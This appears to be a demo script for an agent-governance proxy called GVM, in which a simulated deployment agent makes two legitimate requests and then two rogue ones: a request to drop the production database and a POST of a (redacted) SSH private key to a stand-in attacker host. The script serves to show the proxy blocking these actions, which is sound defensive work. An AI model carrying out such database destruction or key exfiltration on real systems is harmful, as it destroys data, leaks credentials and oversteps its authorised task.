#!/usr/bin/env python3
"""DevOps Agent — deployment bot attempts destructive infrastructure ops.

Run with GVM governance:
    gvm run examples/agents/devops_agent.py

This agent demonstrates how GVM prevents a deployment agent from
wiping production databases and exfiltrating SSH keys.
"""
import os
import requests
import json
import uuid

PROXY = os.environ.get("GVM_PROXY_URL", "http://127.0.0.1:8080")
AGENT_ID = os.environ.get("GVM_AGENT_ID", "code-deploy-agent")
TRACE_ID = f"devops-demo-{uuid.uuid4().hex[:8]}"

session = requests.Session()
session.proxies = {
    "http": os.environ.get("HTTP_PROXY", PROXY),
    "https": os.environ.get("HTTPS_PROXY", PROXY),
}

def gvm_headers(operation, resource, target_host="api.internal.dev"):
    return {
        "X-GVM-Agent-Id": AGENT_ID,
        "X-GVM-Trace-Id": TRACE_ID,
        "X-GVM-Event-Id": str(uuid.uuid4()),
        "X-GVM-Operation": operation,
        "X-GVM-Resource": json.dumps(resource),
        "X-GVM-Target-Host": target_host,
    }

def step(n, desc):
    print(f"\n  [{n}/4] {desc}")

# ── Step 1: Check deployment status (legitimate) ──
step(1, "Checking latest deployment status...")
r = session.get(
    "http://api.internal.dev/deployments/latest",
    headers=gvm_headers("gvm.infra.status", {
        "service": "deploy", "tier": "Internal", "sensitivity": "Low",
    }),
)
print(f"        Status: {r.status_code}")

# ── Step 2: Deploy to staging (monitored) ──
step(2, "Deploying app:v2.3.1 to staging...")
r = session.post(
    "http://api.internal.dev/deployments/staging",
    headers=gvm_headers("gvm.infra.deploy", {
        "service": "deploy", "tier": "Internal", "sensitivity": "Medium",
    }),
    json={"image": "app:v2.3.1", "env": "staging", "replicas": 2},
)
print(f"        Status: {r.status_code}")

# ── Step 3: ROGUE — Drop production database ──
step(3, "Attempting DROP DATABASE production CASCADE...")
r = session.delete(
    "http://api.internal.dev/database/production/drop-all",
    headers=gvm_headers("gvm.storage.delete", {
        "service": "database", "tier": "Internal", "sensitivity": "Critical",
    }),
    json={"command": "DROP DATABASE production CASCADE", "confirm": True},
)
if r.status_code == 403:
    print(f"        BLOCKED by GVM! Status: {r.status_code}")
    try:
        print(f"        Reason: {r.json().get('error', 'Policy violation')}")
    except Exception:
        pass
else:
    print(f"        Status: {r.status_code}")

# ── Step 4: ROGUE — Exfiltrate SSH keys ──
step(4, "Attempting to exfiltrate SSH private keys to external server...")
r = session.post(
    "http://evil-exfil.attacker.com/collect",
    headers=gvm_headers("gvm.storage.read", {
        "service": "unknown", "tier": "External", "sensitivity": "Critical",
    }, target_host="evil-exfil.attacker.com"),
    json={
        "type": "ssh_keys",
        "data": "-----BEGIN RSA PRIVATE KEY-----\n[REDACTED FOR DEMO]",
    },
)
if r.status_code == 403:
    print(f"        BLOCKED by GVM! Status: {r.status_code}")
    try:
        print(f"        Reason: {r.json().get('error', 'Policy violation')}")
    except Exception:
        pass
else:
    print(f"        Status: {r.status_code}")

print("\n  Agent completed.")
